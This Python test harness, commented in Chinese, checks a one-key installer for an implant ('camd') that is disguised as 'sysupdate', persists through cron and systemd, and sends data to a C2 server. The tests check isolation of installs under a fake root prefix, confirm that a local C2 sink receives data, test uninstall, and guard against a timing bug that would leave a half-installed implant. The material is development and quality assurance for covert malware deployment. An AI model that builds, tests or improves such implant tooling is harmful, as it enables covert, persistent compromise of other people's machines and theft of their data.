#!/usr/bin/env python3
"""一键脚本假根（PREFIX）守卫。

为什么需要：此前一键脚本所有落点硬编码 /etc/camd、/usr/local/bin/camd、
/etc/cron.d/camd。后果有三，第三条最阴：
  1. 每跑一次守卫就往真实 /etc 写一遍，靠 uninstall 事后清理；
  2. 两份不同配置的部署在同一台机器上互相覆盖，无法验证"互不干扰"；
  3. run.sh 里还写着死路径 /etc/camd —— 即使改了 CONF_DIR 也无效，
     假根下 run.sh 会去读真根 conf，表现为"服务在跑但 C2 地址不对"。

正向断言：真根零污染、假根内文件齐全、run.sh 前缀正确、C2 实收、
          两份部署互不干扰、uninstall 只清自己。
反向注入：把路径派生改回硬编码，真根必须被污染且 P1 必须变红。
          不做这条，其余 7 项全绿也可能只是恒绿。
"""

import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time


def _default_name(tpl):
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"',
                  open(tpl, encoding="utf-8").read(), re.M)
    if not m:
        raise SystemExit("[FATAL] 无法从模板解析默认 NAME——"
                         "守卫会按旧名找落点，失配方向是假阴性（恒绿）")
    return m.group(1)



HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)                      # 21_exfil
TPL = os.path.join(ROOT, "onekey.sh")
DEFN = _default_name(TPL)
CAMD = os.path.join(os.path.dirname(ROOT), "agent_windows", "build", "linux", "camd")

REAL_PATHS = ["/etc/sysupdate", "/usr/local/bin/sysupdate", "/etc/cron.d/sysupdate",
              "/var/lib/sysupdate", "/etc/systemd/system/sysupdate.service"]

fails = []
def check(cond, name, detail=""):
    print("[%s] %s%s" % ("OK  " if cond else "FAIL", name, ("  -- " + detail) if detail else ""))
    if not cond:
        fails.append(name)
    return cond

def free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]; s.close(); return p

class Sink(threading.Thread):
    """真实 TCP 收端：只计数，供'送达字节数'断言。"""
    def __init__(self, port):
        super().__init__(daemon=True); self.port = port
        self.total = 0; self.conns = 0; self.sock = None; self.stop = False
    def run(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", self.port)); s.listen(8); s.settimeout(0.5); self.sock = s
        while not self.stop:
            try:
                c, _ = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            self.conns += 1
            c.settimeout(3.0)
            try:
                while True:
                    b = c.recv(65536)
                    if not b: break
                    self.total += len(b)
            except OSError:
                pass
            finally:
                try: c.close()
                except OSError: pass
    def close(self):
        self.stop = True
        try:
            if self.sock: self.sock.close()
        except OSError: pass

def build_pkg(out, tpl=None):
    """用（可能被注入过的）模板生成一键包。

    打包器的模板固定为"同目录的 onekey.sh"，没有 --template 参数。所以变异
    模板必须连同打包器一起复制到临时目录再执行——直接改写真实模板的话，
    一旦中途出错就会留下一个被注入过的部署脚本，那比测出的缺陷更糟。
    """
    if tpl is None:
        cmd = [sys.executable, os.path.join(ROOT, "make_onekey.py"),
               "amd64=" + CAMD, "-o", out]
    else:
        d = tempfile.mkdtemp(prefix="mut_tpl_")
        shutil.copy(os.path.join(ROOT, "make_onekey.py"), d)
        shutil.copy(tpl, os.path.join(d, "onekey.sh"))
        cmd = [sys.executable, os.path.join(d, "make_onekey.py"),
               "amd64=" + CAMD, "-o", out]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.returncode, r.stdout + r.stderr

def run(pkg, action, prefix=None, c2=None, extra=()):
    cmd = ["sh", pkg, action]
    if prefix: cmd += ["--prefix", prefix]
    if c2: cmd += ["--c2", c2]
    cmd += list(extra)
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    return r.returncode, r.stdout + r.stderr

def run_sec(pkg, prefix, c2, sec):
    """强制 date +%S 返回 sec，确定性复现前导零/八进制缺陷。

    不能靠"多跑几次撞时间"——触发窗口只有每分钟第 8、9 秒（3.3%）。
    """
    d = tempfile.mkdtemp(prefix="fakedate")
    fd = os.path.join(d, "date")
    with open(fd, "w") as f:
        f.write("#!/bin/sh\n"
                "case \"$1\" in '+%%S') echo %s ;; *) exec /bin/date \"$@\" ;; esac\n" % sec)
    os.chmod(fd, 0o755)
    env = dict(os.environ, PATH=d + ":" + os.environ["PATH"])
    cmd = ["sh", pkg, "install", "--prefix", prefix, "--c2", c2, "--backend", "mock"]
    r = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=180)
    shutil.rmtree(d, ignore_errors=True)
    return r.returncode, r.stdout + r.stderr


def conf_key(prefix):
    p = os.path.join(prefix, "etc/sysupdate/sysupdate.conf")
    if not os.path.exists(p): return None
    for line in open(p):
        if line.startswith("CAMD_KEY="): return line.strip()
    return None

def main():
    port = free_port()
    sink = Sink(port); sink.start(); time.sleep(0.5)
    c2 = "127.0.0.1:%d" % port

    A = "/tmp/pfxA"; B = "/tmp/pfxB"
    for d in (A, B):
        shutil.rmtree(d, ignore_errors=True)

    pkg = "/tmp/ok_pfx.sh"
    rc, out = build_pkg(pkg)
    if not check(rc == 0, "P0 一键包生成成功", out[-200:] if rc else ""):
        sink.close(); return 1
    check(os.path.exists(CAMD), "P0b camd 产物存在", CAMD)
    if not os.path.exists(CAMD):
        sink.close(); return 1

    # ---- 真根基线：本轮开始前必须是干净的 ----
    dirty = [p for p in REAL_PATHS if os.path.exists(p)]
    if dirty:
        print("[FATAL] 真根已被污染，无法判定本轮是否造成: %s" % dirty)
        sink.close(); return 1

    # ---- 假根 A ----
    rc, out = run(pkg, "install", prefix=A, c2=c2, extra=["--backend", "mock"])
    print("--- install A (rc=%d) ---\n%s" % (rc, out[-1200:]))

    # P1 核心：真根零污染
    leaked = [p for p in REAL_PATHS if os.path.exists(p)]
    check(not leaked, "P1 假根部署后真根零污染", "泄漏=%s" % leaked)

    # P2 假根内文件齐全
    want = ["etc/sysupdate/sysupdate.conf", "usr/local/bin/sysupdate",
            "var/lib/sysupdate/run.sh", "etc/cron.d/sysupdate"]
    missing = [w for w in want if not os.path.exists(os.path.join(A, w))]
    check(not missing, "P2 假根内落点齐全", "缺失=%s" % missing)

    # P3 run.sh 的前缀必须是 A（此前写死 /etc/camd，改 CONF_DIR 无效）
    runsh = os.path.join(A, "var/lib/sysupdate/run.sh")
    body = open(runsh).read() if os.path.exists(runsh) else ""
    # 判据从"存在 ROOT_PREFIX='<A>' 这一行"改为"CONF_ABS/BIN_ABS 的实际
    # 取值以 A 开头"。前者只证明某个变量被赋了值，证明不了路径真的落在
    # 假根；后者验的是真实取值，且变量名再换也不影响本断言。
    # 注意不可退化成 '"%s" in body' —— 注释里也会提到 A，那样恒绿。
    mc = re.search(r'^CONF_ABS="([^"]+)"', body, re.M)
    mb = re.search(r'^BIN_ABS="([^"]+)"', body, re.M)
    ok3 = (mc is not None and mb is not None
           and mc.group(1).startswith(A) and mb.group(1).startswith(A))
    check(ok3, "P3 run.sh 路径前缀为假根 A",
          "conf=%s bin=%s 期望前缀=%s" % (
              mc.group(1) if mc else "无", mb.group(1) if mb else "无", A))
    # P4 不得残留裸真根路径（注释除外，只看以 . 开头的 source 行与 exec 行）
    code_lines = [l for l in body.split("\n")
                  if l.strip() and not l.strip().startswith("#")]
    bare = [l for l in code_lines if '"/etc/' in l or ' "/usr/local/bin/sysupdate"' in l]
    # bool(body) 不可省：run.sh 不存在时 body 为空 → code_lines 为空 →
    # bare 为空 → 断言 PASS。那就是"文件根本没生成"被记成"内容正确"，
    # 与之前"空输入恒绿"是同一类判据漏洞。
    check(bool(body) and not bare, "P4 run.sh 代码行无裸真根路径",
          "残留=%s%s" % (bare, "（run.sh 为空或缺失）" if not body else ""))

    # P5 C2 实收（verify_run 走 tcp://，与驻留同源）
    check(sink.total > 0, "P5 试运行信元送达 C2",
          "实收=%d 连接=%d" % (sink.total, sink.conns))

    # ---- 假根 B：不同配置，验证互不干扰 ----
    ka = conf_key(A)
    rc2, out2 = run(pkg, "install", prefix=B, c2=c2, extra=["--backend", "mock"])
    print("--- install B (rc=%d) ---\n%s" % (rc2, out2[-600:]))
    check(conf_key(A) == ka and ka is not None,
          "P6 部署 B 未改动 A 的配置", "A密钥=%s" % (ka or "无"))
    check(os.path.exists(os.path.join(B, "etc/sysupdate/sysupdate.conf")),
          "P6b 假根 B 自身落点齐全")

    # ---- uninstall A：只清自己 ----
    rc3, out3 = run(pkg, "uninstall", prefix=A)
    print("--- uninstall A (rc=%d) ---\n%s" % (rc3, out3[-600:]))
    check(not os.path.exists(os.path.join(A, "etc/sysupdate")), "P7 假根 A 已清空")
    check(os.path.exists(os.path.join(B, "etc/sysupdate/sysupdate.conf")),
          "P7b uninstall A 未波及假根 B")

    # ---- 反向注入：路径派生改回硬编码 ----
    src = open(TPL).read()
    # 变异 = 剥离 $PREFIX，退回硬编码真根路径（这正是本守卫要防的原始缺陷）。
    # 注意源串必须是脚本里的实际写法 $PREFIX/etc/$NAME —— 此前写成字面
    # camd，改名后匹配不上，R0 报"未改变模板内容"而其余断言照常全绿，
    # 是典型的"守卫静默失效而报告一切正常"。
    mutated = src.replace("CONF_DIR=$PREFIX/etc/$NAME", "CONF_DIR=/etc/$NAME") \
                 .replace("BIN_DST=$PREFIX/usr/local/bin/$NAME", "BIN_DST=/usr/local/bin/$NAME")
    if mutated == src:
        check(False, "R0 反向注入生效（未改变模板内容）")
        sink.close(); return 1
    mtpl = "/tmp/onekey_mutated.sh"
    open(mtpl, "w").write(mutated)
    mpkg = "/tmp/ok_pfx_mut.sh"
    rc4, out4 = build_pkg(mpkg, tpl=mtpl)
    if not check(rc4 == 0, "R0 变异包生成成功", out4[-200:] if rc4 else ""):
        sink.close(); return 1

    rc5, out5 = run(mpkg, "install", prefix=B, c2=c2, extra=["--backend", "mock"])
    print("--- install 变异包 (rc=%d) ---\n%s" % (rc5, out5[-600:]))
    leaked2 = [p for p in REAL_PATHS if os.path.exists(p)]
    check(leaked2, "R1 硬编码版必然污染真根（证明 P1 非恒绿）",
          "污染=%s" % (leaked2 or "无——P1 是恒绿的"))

    # 清理真根污染（否则后续所有守卫都被带偏）
    if leaked2:
        subprocess.run(["sh", mpkg, "uninstall"], capture_output=True, text=True)
        left = [p for p in REAL_PATHS if os.path.exists(p)]
        check(not left, "R2 真根污染已清理", "残留=%s" % left)

    # ---- T：时间依赖（前导零/八进制）----
    # install 在写 conf/bin 之后才算 cron 分位。该步一旦崩，rc!=0 中断，
    # 而 conf/bin 已在盘上——留下半个植入体。故断言"不中断"而非"能重试"。
    for sec in ("08", "09"):
        C = tempfile.mkdtemp(prefix="pfxT")
        rcT, outT = run_sec(pkg, C, c2, sec)
        cronT = os.path.join(C, "etc/cron.d/sysupdate")
        check(rcT == 0, "T1 date+%%S=%s 时 install 不中断" % sec,
              "rc=%d %s" % (rcT, outT[-200:] if rcT else ""))
        check(os.path.exists(cronT),
              "T2 date+%%S=%s 时 cron 条目已写入" % sec)
        subprocess.run(["sh", pkg, "uninstall", "--prefix", C],
                       capture_output=True, text=True)
        shutil.rmtree(C, ignore_errors=True)

    # 收尾
    for d in (A, B): shutil.rmtree(d, ignore_errors=True)
    sink.close()
    print("\n计数: 失败 %d" % len(fails))
    return 1 if fails else 0

if __name__ == "__main__":
    sys.exit(main())
